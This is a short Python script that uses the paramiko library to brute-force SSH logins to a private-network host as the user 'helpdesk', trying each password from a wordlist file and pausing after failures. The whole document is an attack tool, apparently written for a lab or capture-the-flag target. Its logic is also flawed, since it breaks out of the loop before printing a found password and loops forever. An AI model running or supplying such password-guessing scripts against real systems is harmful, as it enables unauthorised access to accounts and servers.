import paramiko
import time


def sshlogin(password):
    #urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    host = '10.11.3.120'
    port = 22
    username = 'helpdesk'
    

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(host, port, username, password)
    #stdin, stdout, stderr = ssh.exec_command('ls')
    #print (stdout.readlines())


file = open("passwords.txt", "r") 
passwords = file.read().split("\n")
nopes = []
client = paramiko.SSHClient()
while True:
    for item in passwords:
        if item not in nopes:
            try:
                login = sshlogin(item)
            except paramiko.AuthenticationException:
                print(item+ ' = nope')
                nopes.append(item)
                client.close()
                time.sleep(20)
            except Exception as e:
                pass
            except EOFError as e:
                pass
            except paramiko.ssh_exception.SSHException as e:
                pass
            except ConnectionError as e:
                pass
            else:
                break
                print('Got it: '+item)
